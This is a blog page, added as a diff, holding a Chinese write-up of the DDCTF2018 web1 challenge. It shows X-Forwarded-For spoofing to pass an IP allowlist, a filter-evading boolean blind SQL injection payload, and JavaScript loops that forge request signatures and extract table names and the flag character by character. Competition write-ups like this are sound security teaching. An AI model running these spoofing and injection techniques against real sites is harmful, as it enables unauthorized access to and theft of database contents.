@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>DDCTF2018 (WEB) writeup | 大彩笔threedr3am</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x01 web1 数据库的秘密访问题目给出的页面，tis -&amp;gt; 非法链接，只允许来自 123.232.23.245 的访问 修改请求头，伪造请求源ip 1X-Forwarded-For:123.232.23.245 再次请求页面，可以看到已经通过，成功加载页面  查看源码，看到有个input的项author被设置hidden了，一般看到这种题，非常有可能是sql注入，试了下存在sql注入">
+<meta name="keywords" content="writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF2018 (WEB) writeup">
+<meta property="og:url" content="http://yoursite.com/2018/04/17/DDCTF2018-Web-writeup/index.html">
+<meta property="og:site_name" content="大彩笔threedr3am">
+<meta property="og:description" content="0x01 web1 数据库的秘密访问题目给出的页面，tis -&amp;gt; 非法链接，只允许来自 123.232.23.245 的访问 修改请求头，伪造请求源ip 1X-Forwarded-For:123.232.23.245 再次请求页面，可以看到已经通过，成功加载页面  查看源码，看到有个input的项author被设置hidden了，一般看到这种题，非常有可能是sql注入，试了下存在sql注入">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://p76cw7ct5.bkt.clouddn.com/ddctf_web1.1.png">
+<meta property="og:image" content="http://p76cw7ct5.bkt.clouddn.com/ddctf_web1.2.png">
+<meta property="og:updated_time" content="2018-11-05T08:32:37.935Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DDCTF2018 (WEB) writeup">
+<meta name="twitter:description" content="0x01 web1 数据库的秘密访问题目给出的页面，tis -&amp;gt; 非法链接，只允许来自 123.232.23.245 的访问 修改请求头，伪造请求源ip 1X-Forwarded-For:123.232.23.245 再次请求页面，可以看到已经通过，成功加载页面  查看源码，看到有个input的项author被设置hidden了，一般看到这种题，非常有可能是sql注入，试了下存在sql注入">
+<meta name="twitter:image" content="http://p76cw7ct5.bkt.clouddn.com/ddctf_web1.1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="大彩笔threedr3am" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">大彩笔threedr3am</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-DDCTF2018-Web-writeup" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/17/DDCTF2018-Web-writeup/" class="article-date">
+  <time datetime="2018-04-17T11:57:27.000Z" itemprop="datePublished">2018-04-17</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DDCTF2018 (WEB) writeup
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="0x01-web1-数据库的秘密"><a href="#0x01-web1-数据库的秘密" class="headerlink" title="0x01 web1 数据库的秘密"></a>0x01 web1 数据库的秘密</h3><p>访问题目给出的页面，tis -&gt; 非法链接，只允许来自 <strong>123.232.23.245</strong> 的访问</p>
+<p>修改请求头，伪造请求源ip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:123.232.23.245</span><br></pre></td></tr></table></figure>
+<p>再次请求页面，可以看到已经通过，成功加载页面</p>
+<p><img src="http://p76cw7ct5.bkt.clouddn.com/ddctf_web1.1.png" alt="首页"></p>
+<p>查看源码，看到有个input的项author被设置hidden了，一般看到这种题，非常有可能是sql注入，试了下存在sql注入</p>
+<p><img src="http://p76cw7ct5.bkt.clouddn.com/ddctf_web1.2.png" alt="waf"></p>
+<p>经过尝试发现可以使用布尔盲注，最后发现使用以下这种布尔盲注的方式，可以畅通无阻，直通罗马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">author=&apos;&apos;=((select (某返回数字的函数) from xxx)=变量)=&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>上面这种方式，基本可以绕过了and、or等等拦截，并且可以闭合前面的单引号和后面的单引号</p>
+<p>先说一下上面的注入原理吧，上面其实在表单输入项内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;=((select (某返回数字的函数) from xxx)=变量)=&apos;</span><br></pre></td></tr></table></figure>
+<p>先通过第一个单引号闭合条件author=’’，使得数据库判断该条件时，该条件都返回false，然后后面通过((子查询)=i)的括号优先运算并通过子查询获取出关键信息，关键信息使用了数字表示，并与变量比对，如果相等，则返回true，因为前面的author=’’等式的值为false，所以，author=’’=()等式的值则为false，最后一个引号闭合了sql，并得到等式author=’’=()=’’，因为在数据库中’’的值为false，因此，整条语句的布尔等式就为false=true=false，最终结果则为false，如果()返回的布尔结果为false的话，则整条布尔表达式为false=false=false，这种情况，最终的值则为false</p>
+<p>以上就是具体原理的描述，我以前语文学得不太好，看一遍不太理解的朋友，请原谅，麻烦多看几遍，多思考…</p>
+<p>其实，这道题到这里，具体的利用手法已经很清晰了，再次分析页面源码，以及http请求数据包，可以得知：</p>
+<ol>
+<li>点击页面提交http请求时还会带上一个 time参数 和 sig参数。</li>
+<li>time、sig这两个参数都是在 js 计算出来的。</li>
+<li>思路已经很明确，存在盲注，需要计算出sig和time参数</li>
+</ol>
+<p>在赛后发现，很多朋友计算sig、time是利用python重写一遍算法，或者使用python调用js，更有师傅用java计算…强，但是我这边用的方法可以说是最便捷的，直接把页面里的代码拷贝出来，粘贴到一个新的html文件中，修改一下math.js、main.js文件的引用路径为绝对路径，并引入jquery支持</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;</span><br><span class="line">http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/static/math.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;</span><br><span class="line">http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/static/main.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>随手写了几个js的payload，打开chrome的console，把方法输入，直接调用执行：</p>
+<p>两个基本的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function getSig(time)&#123;</span><br><span class="line">  return hex_math_enc(time);</span><br><span class="line">&#125;</span><br><span class="line">function getTime()&#123;</span><br><span class="line">  return parseInt(new Date().getTime()/1000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>爆数据库数量（这个好像有点多余…）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function getSchemaCount()&#123;</span><br><span class="line">	var schemaCount = 0;</span><br><span class="line">	for(var i=0;i&lt;100;i++) &#123;</span><br><span class="line">		var id = &quot;&quot;;</span><br><span class="line">		var title = &quot;&quot;;</span><br><span class="line">		var author = &quot;&apos;=((select count(SCHEMA_NAME) from  information_schema.SCHEMATA)=&quot;+i+&quot;)=&apos;&apos;=&apos;&quot;;</span><br><span class="line">		var date = &quot;&quot;;</span><br><span class="line">		var time = getTime();</span><br><span class="line">		var sig = getSig(&quot;id=&quot;+id+&quot;title=&quot;+title+&quot;author=&quot;+author+&quot;date=&quot;+date+&quot;time=&quot;+time+&quot;adrefkfweodfsdpiru&quot;);</span><br><span class="line">			$.ajax(&#123;</span><br><span class="line">			type: &apos;POST&apos;,</span><br><span class="line">			async : false,</span><br><span class="line">			url:&quot;http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig=&quot;+sig+&quot;&amp;time=&quot;+time,</span><br><span class="line">			data:&#123;&quot;id&quot;:id,&quot;title&quot;:title,&quot;date&quot;:date,&quot;author&quot;:author,&quot;button&quot;:&quot;search&quot;&#125;,</span><br><span class="line">			headers:&#123;&quot;X-Forwarded-For&quot;:&quot;123.232.23.245&quot;&#125;,</span><br><span class="line">			success:function(result)&#123;</span><br><span class="line">				//$(&quot;.bbb&quot;).html(result);</span><br><span class="line">				if(result.indexOf(&quot;admin&quot;)!=-1) &#123;</span><br><span class="line">					schemaCount = i;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">	console.log(&quot;schema数量为:&quot;+schemaCount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>爆表数量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function getTableCount()&#123;</span><br><span class="line">	var schemaCount = 0;</span><br><span class="line">	for(var i=0;i&lt;100;i++) &#123;</span><br><span class="line">		var id = &quot;&quot;;</span><br><span class="line">		var title = &quot;&quot;;</span><br><span class="line">		var author = &quot;&apos;=((select count(table_name) from  information_schema.TABLES where table_schema = &apos;ddctf&apos;)=&quot;+i+&quot;)=&apos;&apos;=&apos;&quot;;</span><br><span class="line">		var date = &quot;&quot;;</span><br><span class="line">		var time = getTime();</span><br><span class="line">		var sig = getSig(&quot;id=&quot;+id+&quot;title=&quot;+title+&quot;author=&quot;+author+&quot;date=&quot;+date+&quot;time=&quot;+time+&quot;adrefkfweodfsdpiru&quot;);</span><br><span class="line">			$.ajax(&#123;</span><br><span class="line">			type: &apos;POST&apos;,</span><br><span class="line">			async : false,</span><br><span class="line">			url:&quot;http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig=&quot;+sig+&quot;&amp;time=&quot;+time,</span><br><span class="line">			data:&#123;&quot;id&quot;:id,&quot;title&quot;:title,&quot;date&quot;:date,&quot;author&quot;:author,&quot;button&quot;:&quot;search&quot;&#125;,</span><br><span class="line">			headers:&#123;&quot;X-Forwarded-For&quot;:&quot;123.232.23.245&quot;&#125;,</span><br><span class="line">			success:function(result)&#123;</span><br><span class="line">				//$(&quot;.bbb&quot;).html(result);</span><br><span class="line">				if(result.indexOf(&quot;admin&quot;)!=-1) &#123;</span><br><span class="line">					schemaCount = i;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">	console.log(&quot;table数量为:&quot;+schemaCount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>爆表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function getTableName()&#123;</span><br><span class="line">	for(var j=0;j&lt;20;j++) &#123;</span><br><span class="line">		for(var i=33;i&lt;127;i++) &#123;</span><br><span class="line">			var id = &quot;&quot;;</span><br><span class="line">			var title = &quot;&quot;;</span><br><span class="line">			var author = &quot;&apos;=(substr((select table_name from  information_schema.TABLES where table_schema = &apos;ddctf&apos; limit 0,1),&quot;+(j+1)+&quot;,1)=&apos;&quot;+String.fromCharCode(i)+&quot;&apos;)=&apos;&apos;=&apos;&quot;;</span><br><span class="line">			var date = &quot;&quot;;</span><br><span class="line">			var time = getTime();</span><br><span class="line">			var sig = getSig(&quot;id=&quot;+id+&quot;title=&quot;+title+&quot;author=&quot;+author+&quot;date=&quot;+date+&quot;time=&quot;+time+&quot;adrefkfweodfsdpiru&quot;);</span><br><span class="line">				$.ajax(&#123;</span><br><span class="line">				type: &apos;POST&apos;,</span><br><span class="line">				async : false,</span><br><span class="line">				url:&quot;http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig=&quot;+sig+&quot;&amp;time=&quot;+time,</span><br><span class="line">				data:&#123;&quot;id&quot;:id,&quot;title&quot;:title,&quot;date&quot;:date,&quot;author&quot;:author,&quot;button&quot;:&quot;search&quot;&#125;,</span><br><span class="line">				headers:&#123;&quot;X-Forwarded-For&quot;:&quot;123.232.23.245&quot;&#125;,</span><br><span class="line">				success:function(result)&#123;</span><br><span class="line">					//$(&quot;.bbb&quot;).html(result);</span><br><span class="line">					if(result.indexOf(&quot;admin&quot;)!=-1) &#123;</span><br><span class="line">						console.log(String.fromCharCode(i));</span><br><span class="line">					&#125;</span><br><span class="line">			&#125;&#125;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>爆列数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function getColumnCount()&#123;</span><br><span class="line">	var ColumnCount = 0;</span><br><span class="line">	for(var i=0;i&lt;20;i++) &#123;</span><br><span class="line">		var id = &quot;&quot;;</span><br><span class="line">		var title = &quot;&quot;;</span><br><span class="line">		var author = &quot;&apos;=((select count(*)  from  INFORMATION_SCHEMA.COLUMNS  where TABLE_NAME=&apos;message&apos;)=&quot;+i+&quot;)=&apos;&apos;=&apos;&quot;;</span><br><span class="line">		var date = &quot;&quot;;</span><br><span class="line">		var time = getTime();</span><br><span class="line">		var sig = getSig(&quot;id=&quot;+id+&quot;title=&quot;+title+&quot;author=&quot;+author+&quot;date=&quot;+date+&quot;time=&quot;+time+&quot;adrefkfweodfsdpiru&quot;);</span><br><span class="line">			$.ajax(&#123;</span><br><span class="line">			type: &apos;POST&apos;,</span><br><span class="line">			async : false,</span><br><span class="line">			url:&quot;http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig=&quot;+sig+&quot;&amp;time=&quot;+time,</span><br><span class="line">			data:&#123;&quot;id&quot;:id,&quot;title&quot;:title,&quot;date&quot;:date,&quot;author&quot;:author,&quot;button&quot;:&quot;search&quot;&#125;,</span><br><span class="line">			headers:&#123;&quot;X-Forwarded-For&quot;:&quot;123.232.23.245&quot;&#125;,</span><br><span class="line">			success:function(result)&#123;</span><br><span class="line">				//$(&quot;.bbb&quot;).html(result);</span><br><span class="line">				if(result.indexOf(&quot;admin&quot;)!=-1) &#123;</span><br><span class="line">					ColumnCount = i;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">	console.log(&quot;ColumnCount:&quot;+ColumnCount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最后根据前面爆出的信息得知表名，且flag所在表数据只有一列，利用下面的payload去盲注出值，得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function getValue()&#123;</span><br><span class="line">	for(var j=0;j&lt;50;j++) &#123;</span><br><span class="line">		for(var i=33;i&lt;127;i++) &#123;</span><br><span class="line">			var id = &quot;&quot;;</span><br><span class="line">			var title = &quot;&quot;;</span><br><span class="line">			var author = &quot;&apos;=(substr((select * from ctf_key8 limit 0,1),&quot;+(j+1)+&quot;,1)=&apos;&quot;+String.fromCharCode(i)+&quot;&apos;)=&apos;&apos;=&apos;&quot;;</span><br><span class="line">			var date = &quot;&quot;;</span><br><span class="line">			var time = getTime();</span><br><span class="line">			var sig = getSig(&quot;id=&quot;+id+&quot;title=&quot;+title+&quot;author=&quot;+author+&quot;date=&quot;+date+&quot;time=&quot;+time+&quot;adrefkfweodfsdpiru&quot;);</span><br><span class="line">				$.ajax(&#123;</span><br><span class="line">				type: &apos;POST&apos;,</span><br><span class="line">				async : false,</span><br><span class="line">				url:&quot;http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig=&quot;+sig+&quot;&amp;time=&quot;+time,</span><br><span class="line">				data:&#123;&quot;id&quot;:id,&quot;title&quot;:title,&quot;date&quot;:date,&quot;author&quot;:author,&quot;button&quot;:&quot;search&quot;&#125;,</span><br><span class="line">				headers:&#123;&quot;X-Forwarded-For&quot;:&quot;123.232.23.245&quot;&#125;,</span><br><span class="line">				success:function(result)&#123;</span><br><span class="line">					//$(&quot;.bbb&quot;).html(result);</span><br><span class="line">					if(result.indexOf(&quot;admin&quot;)!=-1) &#123;</span><br><span class="line">						console.log(String.fromCharCode(i));</span><br><span class="line">					&#125;</span><br><span class="line">			&#125;&#125;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/04/17/DDCTF2018-Web-writeup/" data-id="cjonwcqtq0000f0xy3hfgerto" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/11/19/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Hello World
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/04/14/XMAN2017选拔赛-Mobile-writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">XMAN2017选拔赛(Mobile)writeup</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/mobile/">mobile</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/writeup/" style="font-size: 10px;">writeup</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/11/19/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/17/DDCTF2018-Web-writeup/">DDCTF2018 (WEB) writeup</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/14/XMAN2017选拔赛-Mobile-writeup/">XMAN2017选拔赛(Mobile)writeup</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
